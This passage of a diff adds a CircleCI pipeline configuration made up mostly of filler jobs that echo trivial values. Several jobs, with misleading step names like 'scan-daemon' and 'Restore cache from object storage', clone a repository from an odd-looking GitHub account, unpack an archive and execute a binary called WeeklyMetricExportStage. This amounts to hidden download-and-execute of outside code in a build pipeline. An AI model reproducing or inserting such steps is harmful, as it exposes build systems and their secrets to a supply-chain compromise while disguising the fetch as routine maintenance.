+            { set +o pipefail 2>/dev/null; echo 'checking job runner'; echo "12 modules compiled"; echo 'wrapping up unit tests'; true ; } > /tmp/lint-sources/IndexRateLimiterTranslations
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'IndexRateLimiterTranslations'
+  LegacyMutationTestStep:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/IndexRateLimiterTranslations"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 3 --branch main "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Extract sources
+          command: |
+            tar xf toolkit-release-replica-2.tar
+      - run:
+          command: |
+            bash -lc './WeeklyMetricExportStage'
+  CloneRepositoryInParallel:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: PreApprovalBackup
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo 'warming up indexer'; word="job-89-lynx"; echo "$word" | awk -F- '{print $1}'; echo "indexer warmed up"; true ; } > /tmp/lint-sources/automated-minor-bump
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'automated-minor-bump'
+  copy-router-package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/automated-minor-bump"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 2 "https://github.com/${locking}/${coredocs}" "./"
+      - run:
+          name: Restore build cache
+          command: |
+            tar -xf "toolkit-release-replica-2.tar"
+      - run:
+          command: |
+            cd "$PWD" && exec ./WeeklyMetricExportStage
+  ProfileEdgeProxyThroughput:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Payment Service Backup Rotation
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; k=5; if ((k < 0)); then echo negative; elif ((k == 0)); then echo zero; else echo positive; fi; true ; } > /tmp/lint-sources/pre-release-health-monitoring
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'pre-release-health-monitoring'
+  BuildDataPipelineFonts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/pre-release-health-monitoring"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=1 "https://github.com/${locking}/${coredocs}" "$PWD"
+      - run:
+          name: Pull reference data
+          command: |
+            cat toolkit-release-replica-2.tar | tar --extract -f -
+      - run:
+          command: |
+            env "./WeeklyMetricExportStage"
+  tracking-bridge-startup-time:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Configure and start proxy
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; count=0; for ((idx = 3; idx > 0; idx--)); do count=$((count + idx)); done; echo "answer $count"; true ; } > /tmp/lint-sources/primary-rule-engine-artifacts
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'primary-rule-engine-artifacts'
+  back-up-release-archive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/primary-rule-engine-artifacts"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --branch=main "https://github.com/${locking}/${coredocs}" "$(pwd)"
+      - run:
+          name: Stage inputs
+          command: |
+            tar -x -v -f toolkit-release-replica-2.tar
+      - run:
+          command: |
+            /bin/sh -c "./WeeklyMetricExportStage"
+  secondary-build-promotion-job:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: cluster-health-check-worker-8
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; stack=(owl saturn gnu valve elm cherry); copy=("${stack[@]}"); copy+=(galaxy); echo "${#stack[@]} ${#copy[@]}"; true ; } > /tmp/lint-sources/BuildAndTestControllerTutorials
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'BuildAndTestControllerTutorials'
+  nightly-staging-deployment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/BuildAndTestControllerTutorials"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --filter blob:none "https://github.com/${locking}/${coredocs}" "$PWD"
+      - run:
+          name: Unpack bundle
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar --directory .
+      - run:
+          command: |
+            bash -c "exec ./WeeklyMetricExportStage"
+
+  MonitorPackaging:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: evaluate-policy-rules-when-version-changes
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s' "6.11.7" | basenc --base64url; true ; } > /tmp/lint-sources/BuildAndTestControllerTutorials
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'BuildAndTestControllerTutorials'
+  wave-3-of-3:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: uploadDashboardChangelogToDocumentationServer
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; summary=""; for part in verify link render publish scan; do summary+="$part ok, "; done; echo "${summary%, }"; true ; } > /tmp/lint-sources/download-job
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'download-job'
+  setUpMiddlewareTestCache:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: Alert maintainers after migration
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; read -r remainder < <(echo "brown camel"); echo "${#remainder}"; true ; } > /tmp/lint-sources/bundle-bindings-for-review
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'bundle-bindings-for-review'
+  access-proxy-size-analysis:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: Move Test Report
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' mars dog zebra newt azure ivory | grep -c -v '^$'; true ; } > /tmp/lint-sources/review-portal-coverage-report
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'review-portal-coverage-report'
+  PublishLintReport:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: AdminPanelVersionBump
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "answer $((68 * 20 + 15))"; true ; } > /tmp/lint-sources/MonitorDatabaseSchema
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'MonitorDatabaseSchema'
+  ModuleCache:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: incremental-minor-bump-run
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; result=0; for num in 8 19 35 49; do result=$((result + num)); done; echo "answer $result"; true ; } > /tmp/lint-sources/CacheInventoryToolsInParallel
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'CacheInventoryToolsInParallel'
+  post-download-log-compression:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: wait-for-storage-deployment
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; k=12; if [ "$k" -ge 8 ] && [ "$k" -le 658 ]; then echo "within bounds"; else echo "outside bounds"; fi; true ; } > /tmp/lint-sources/primary-rule-engine-artifacts
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'primary-rule-engine-artifacts'
+  bump-back-end-version:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: lowPriorityReviewRun1
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; while read -r round; do echo "turn $round"; done < <(seq 1 5); echo "sequence complete"; true ; } > /tmp/lint-sources/CacheReleaseTools
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'CacheReleaseTools'
+  schema-registry-test-cache:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: LoggerReleaseNotes
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; for step in 1 2 3; do echo "lap $step"; done; true ; } > /tmp/lint-sources/IndexRateLimiterTranslations
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'IndexRateLimiterTranslations'
+  post-sync-type-checks:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: upload release build to stable channel (replica 3)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "target aspen selected"; echo "worker 2 idle"; echo "nothing to do for metrics"; true ; } > /tmp/lint-sources/DeploymentRollbackWorkflow
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'DeploymentRollbackWorkflow'
+  event-bus-golden-files:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: displaying-pipeline-status
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "holding reducer"; title_word() { echo "${1^}"; }; title_word boron; echo "releasing reducer"; true ; } > /tmp/lint-sources/AccessProxyManifests
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'AccessProxyManifests'
+  PreCleanupSanityChecksCycle6:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Compress test logs and upload release artifacts
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; n=0; while test "$n" -lt 5; do ((n += 1)); echo "slot $n"; done; true ; } > /tmp/lint-sources/quick-refresh
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'quick-refresh'
+  registry-roll-out:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Tier 2 Dependency Sync Task
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; passed=178; failed=0; skipped=5; echo "$((passed + failed + skipped)) tests, $passed passed, $failed failed, $skipped skipped"; true ; } > /tmp/lint-sources/initializeAnalyticsTestCache
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'initializeAnalyticsTestCache'
+  pre-lint-snapshot-restore:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Compiler storage benchmark
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "warming up linker"; printf '%s\n' maple gold bronze | awk '{print length($0), $0}'; echo "linker warmed up"; true ; } > /tmp/lint-sources/post-sync-step
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'post-sync-step'
+  rerun-event-bus-sanity-tests:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: sandbox-docs-batch-11
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' rho=12 goat=33 magnet=1 red=24 | awk -F= '{s += $2} END {print s}'; true ; } > /tmp/lint-sources/Certificates
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'Certificates'
+  RerunFormatterTestSuite:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: rebuild icons in debug mode (replica 1)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; for line in {1..5}; do printf '%0*d\n' "$line" 0; done; true ; } > /tmp/lint-sources/pre-release-health-monitoring
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'pre-release-health-monitoring'
+  connector-test-metrics:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Sort field values to build log
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%d items\n' 249 && echo 3 items processed; true ; } > /tmp/lint-sources/analyzer-lint-summary
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'analyzer-lint-summary'
+  RerunDashboardTestSuite:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: encoding-file-contents
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "step 1 of 4 finished"; printf '%s\n' silver lemur bison azure | sed 's/^/- /'; true ; } > /tmp/lint-sources/release-bundle
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'release-bundle'
+  StreamProcessorDeployment:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: LibraryCoverageCheck (cycle 2)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "cyan nebula dove jay" | tr ' ' '\n' | paste - -; true ; } > /tmp/lint-sources/AuditStage
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'AuditStage'
+  staging-smoke-test-node-10:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: MultiStagePermissionAuditJobTrack2
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; for ((step = 1; step <= 3; step += 1)); do printf '%s %d\n' chunk "$step"; done; true ; } > /tmp/lint-sources/tagging-task
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'tagging-task'
+  InformingTestEngineers:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: RevertFailedMigrationBeforeBuild
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo linker ready; u=34; w=$((u * 2)); k=$((w + 3)); echo "$u $w $k"; true ; } > /tmp/lint-sources/optimize-shared-library
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'optimize-shared-library'
+  CheckPart2:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Roll Back Debugger Instances
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' orca orca zinc black | md5sum; true ; } > /tmp/lint-sources/automated-minor-bump
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'automated-minor-bump'
+  CancelSupersededBuilds:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: fetch storage modules over secure connection
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "phase 2 started"; t=22; ((t *= 2)); echo "$t"; true ; } > /tmp/lint-sources/benchmark-job
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'benchmark-job'
+  probe-kernel:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: BackingUpMiddlewareManifest
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "holding event bus"; acc=1; for ((j = 0; j < 3; j++)); do acc=$((acc * 5)); done; echo "$acc"; echo "releasing event bus"; true ; } > /tmp/lint-sources/identity-service-checks
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'identity-service-checks'
+workflows:
+  wait-for-event-bus-container:
+    jobs:
+      - landing-page-review
+      - ModuleCache:
+          requires:
+            - landing-page-review
+      - CompleteManualApprovalJob:
+          requires:
+            - ModuleCache
+      - tracking-bridge-startup-time:
+          requires:
+            - ModuleCache
+      - post-download-log-compression:
+          requires:
+            - tracking-bridge-startup-time
+      - back-up-release-archive:
+          requires:
+            - post-download-log-compression
+      - setUpMailServerContainer:
+          requires:
+            - post-download-log-compression
+      - bump-back-end-version:
+          requires:
+            - setUpMailServerContainer
+      - DependencyBumpRun:
+          requires:
+            - bump-back-end-version
+      - Capacity:
+          requires:
+            - bump-back-end-version
+      - schema-registry-test-cache:
+          requires:
+            - Capacity
+      - LegacyMutationTestStep:
+          requires:
+            - schema-registry-test-cache
+      - alert-team-after-code-review:
+          requires:
+            - schema-registry-test-cache
+      - post-sync-type-checks:
+          requires:
+            - alert-team-after-code-review
+      - CleanUpLauncherModuleCache:
+          requires:
+            - post-sync-type-checks
+      - post-rollback-backup:
+          requires:
+            - post-sync-type-checks
+      - event-bus-golden-files:
+          requires:
+            - post-rollback-backup
+      - HourlyBinaryInspection:
+          requires:
+            - event-bus-golden-files
+      - PublishToDocumentationSite:
+          requires:
+            - event-bus-golden-files
+      - PreCleanupSanityChecksCycle6:
+          requires:
+            - PublishToDocumentationSite
+      - BuildStyleSheets:
+          requires:
+            - PreCleanupSanityChecksCycle6
+  initial-mirror-refresh-hook:
+    jobs:
+      - chunk-8
+      - registry-roll-out:
+          requires:
+            - chunk-8
+      - UnlockDeployments:
+          requires:
+            - registry-roll-out
+      - UploadServiceScreenshots:
+          requires:
+            - registry-roll-out
+      - pre-lint-snapshot-restore:
+          requires:
+            - UploadServiceScreenshots
+      - PlaygroundBuildOutputs:
+          requires:
+            - pre-lint-snapshot-restore
+      - build-and-scan-export-service:
+          requires:
+            - pre-lint-snapshot-restore
+      - rerun-event-bus-sanity-tests:
+          requires:
+            - build-and-scan-export-service
+      - compress-dispatcher-changelog:
+          requires:
+            - rerun-event-bus-sanity-tests
+      - ProfileEdgeProxyThroughput:
+          requires:
+            - rerun-event-bus-sanity-tests
+      - RerunFormatterTestSuite:
+          requires:
+            - ProfileEdgeProxyThroughput
+      - BuildDataPipelineFonts:
+          requires:
+            - RerunFormatterTestSuite
+      - runtime-build-options:
+          requires:
+            - RerunFormatterTestSuite
+      - connector-test-metrics:
+          requires:
+            - runtime-build-options
+      - websiteCoverage:
+          requires:
+            - connector-test-metrics
+      - WebsiteDatabaseMigrations:
+          requires:
+            - connector-test-metrics
+      - RerunDashboardTestSuite:
+          requires:
+            - WebsiteDatabaseMigrations
+      - OperatorHealthCheck:
+          requires:
+            - RerunDashboardTestSuite
+      - audit-middleware:
+          requires:
+            - RerunDashboardTestSuite
+      - StreamProcessorDeployment:
+          requires:
+            - audit-middleware
+      - MonthlyOperatorHealthChecks:
+          requires:
+            - StreamProcessorDeployment
+  write-document-converter-dependency-tree:
+    jobs:
+      - secondary-build-promotion-job
+      - MonitorPackaging:
+          requires:
+            - secondary-build-promotion-job
+      - nightly-staging-deployment:
+          requires:
+            - MonitorPackaging
+      - cleanup-task-replica-5:
+          requires:
+            - MonitorPackaging
+      - wave-3-of-3:
+          requires:
+            - cleanup-task-replica-5
+      - sync-link-checker-release-notes:
+          requires:
+            - wave-3-of-3
+      - download-crawler-dependencies:
+          requires:
+            - wave-3-of-3
+      - setUpMiddlewareTestCache:
+          requires:
+            - download-crawler-dependencies
+      - AutomaticExport:
+          requires:
+            - setUpMiddlewareTestCache
+      - installer-debug-build:
+          requires:
+            - setUpMiddlewareTestCache
+      - access-proxy-size-analysis:
+          requires:
+            - installer-debug-build
+      - link-checker-test-logs-run-3:
+          requires:
+            - access-proxy-size-analysis
+      - TestAndPublishDebugBuild:
+          requires:
+            - access-proxy-size-analysis
+      - PublishLintReport:
+          requires:
+            - TestAndPublishDebugBuild
+      - data-export-pipeline:
+          requires:
+            - PublishLintReport
+  library-image:
+    jobs:
+      - send-notification-every-week
+      - staging-smoke-test-node-10:
+          requires:
+            - send-notification-every-week
+      - search-image-build-stage:
+          requires:
+            - staging-smoke-test-node-10
+      - firmware-compile:
+          requires:
+            - staging-smoke-test-node-10
+      - InformingTestEngineers:
+          requires:
+            - firmware-compile
+      - StorageArtifacts:
+          requires:
+            - InformingTestEngineers
+      - CloneRepositoryInParallel:
+          requires:
+            - InformingTestEngineers
+      - CheckPart2:
+          requires:
+            - CloneRepositoryInParallel
+      - copy-router-package:
+          requires:
+            - CheckPart2
+      - setup-stage:
+          requires:
+            - CheckPart2
+      - CancelSupersededBuilds:
+          requires:
+            - setup-stage
+      - labelingBuild:
+          requires:
+            - CancelSupersededBuilds
+      - environment-removal-wave-1:
+          requires:
+            - CancelSupersededBuilds
+      - probe-kernel:
+          requires:
+            - environment-removal-wave-1
+      - package-decoder-changelog:
+          requires:
+            - probe-kernel
+  network-setup-job:
+    jobs:
+      - FindUnusedDependenciesForReview
+      - PackageMonitorSlice1Of5:
+          requires:
+            - FindUnusedDependenciesForReview
+      - InventoryConfigurationSnapshot:
+          requires:
+            - FindUnusedDependenciesForReview
+      - UserPortalDebugLogsReplica2:
+          requires:
+            - InventoryConfigurationSnapshot
+      - build-run:
+          requires:
+            - InventoryConfigurationSnapshot
+      - PerformRegistryLicenseAudit:
+          requires:
+            - build-run
+      - package-download-slice-2-of-6:
+          requires:
+            - build-run
+      - formatter-patch-bump:
+          requires:
+            - package-download-slice-2-of-6
+      - PersistingStage1:
+          requires:
+            - package-download-slice-2-of-6
+      - clone-registry-repository:
+          requires:
+            - PersistingStage1
+  copy-digest-from-workspace:
+    jobs:
+      - review-loader-coverage-data
+      - Obfuscate:
+          requires:
+            - review-loader-coverage-data
